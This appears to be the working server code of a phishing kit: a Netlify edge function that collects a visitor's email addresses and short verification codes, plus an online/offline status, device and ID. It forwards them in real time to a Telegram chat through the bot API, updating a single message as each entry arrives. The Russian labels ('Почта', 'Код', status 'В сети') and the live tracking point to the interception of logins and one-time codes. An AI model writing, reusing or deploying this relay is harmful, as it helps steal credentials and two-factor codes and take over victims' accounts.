import type { Config, Context } from "@netlify/edge-functions";
import { z } from "https://esm.sh/zod@3.22.4";

export const config: Config = {
  path: "/api/telegram",
};

const PayloadSchema = z.object({
  message_id: z.union([z.number().int().positive(), z.null()]).optional(),
  emails: z.array(
    z.object({
      text: z.string().trim().min(1).max(254),
      time: z.string().max(20).optional(),
    })
  ).max(5),
  codes: z.array(
    z.object({
      text: z.string().trim().max(12),
      time: z.string().max(20).optional(),
    })
  ).max(5),
  status: z.enum(["В сети", "Не в сети"]).catch("В сети"),
  device: z.string().max(100).catch("Неизвестное устройство"),
  unique_id: z.string().regex(/^[a-zA-Z0-9_-]{4,64}$/).catch("unknown"),
});

function isAllowedOrigin(request: Request): boolean {
  const origin = request.headers.get("origin");
  if (!origin) return true; // запросы без Origin (например, same-origin навигация/инструменты)
  try {
    const reqUrl = new URL(request.url);
    const origUrl = new URL(origin);
    return reqUrl.host === origUrl.host;
  } catch {
    return false;
  }
}

export default async (request: Request, context: Context) => {
  if (request.method !== "POST") {
    return new Response("Method Not Allowed", { status: 405 });
  }

  if (!isAllowedOrigin(request)) {
    return new Response(JSON.stringify({ error: "Forbidden origin" }), {
      status: 403,
      headers: { "Content-Type": "application/json" },
    });
  }

  let payload;
  try {
    const rawBody = await request.json();
    payload = PayloadSchema.parse(rawBody);
  } catch {
    return new Response(JSON.stringify({ error: "Invalid payload" }), {
      status: 400,
      headers: { "Content-Type": "application/json" },
    });
  }

  const TOKEN = Netlify.env.get("TELEGRAM_BOT_TOKEN");
  const CHAT_ID = Netlify.env.get("TELEGRAM_CHAT_ID");

  if (!TOKEN || !CHAT_ID) {
    return new Response(JSON.stringify({ error: "Config missing" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }

  const telegramUrl = `https://api.telegram.org/bot${TOKEN}/`;
  const statusIcon = payload.status === "В сети" ? "🟢" : "🔴";

  const emailText = payload.emails.length > 0
    ? payload.emails.map((e) => `${e.text}${e.time ? ` - ${e.time}` : ""}`).join("\n")
    : "еще не введена";

  const codeText = payload.codes.length > 0 && payload.codes[0].text
    ? payload.codes.map((c) => `${c.text}${c.time ? ` - ${c.time}` : ""}`).join("\n")
    : "еще не введен";

  const text =
    `----------------------------------------------------\n` +
    `🛡️ ДАННЫЕ И АКТИВНОСТЬ\n` +
    `----------------------------------------------------\n\n` +
    `💡 Статус : ${statusIcon} ${payload.status}\n\n` +
    `📩 Почта : ${emailText}\n\n` +
    `🔑 Код : ${codeText}\n\n` +
    `💻 Устройство : ${payload.device}\n` +
    `ID = ${payload.unique_id}`;

  let responseMessageId: number | null = payload.message_id ?? null;

  try {
    if (responseMessageId) {
      const editRes = await fetch(telegramUrl + "editMessageText", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          message_id: responseMessageId,
          text,
        }),
      });
      const editData = await editRes.json();
      if (
        editData.ok ||
        (editData.description && editData.description.includes("message is not modified"))
      ) {
        return new Response(JSON.stringify({ success: true, message_id: responseMessageId }), {
          status: 200,
          headers: { "Content-Type": "application/json" },
        });
      }
    }

    const sendRes = await fetch(telegramUrl + "sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
      }),
    });
    const sendData = await sendRes.json();
    if (sendData.ok && sendData.result?.message_id) {
      responseMessageId = sendData.result.message_id;
    }

    return new Response(JSON.stringify({ success: true, message_id: responseMessageId }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch {
    return new Response(JSON.stringify({ error: "Telegram request failed" }), {
      status: 502,
      headers: { "Content-Type": "application/json" },
    });
  }
};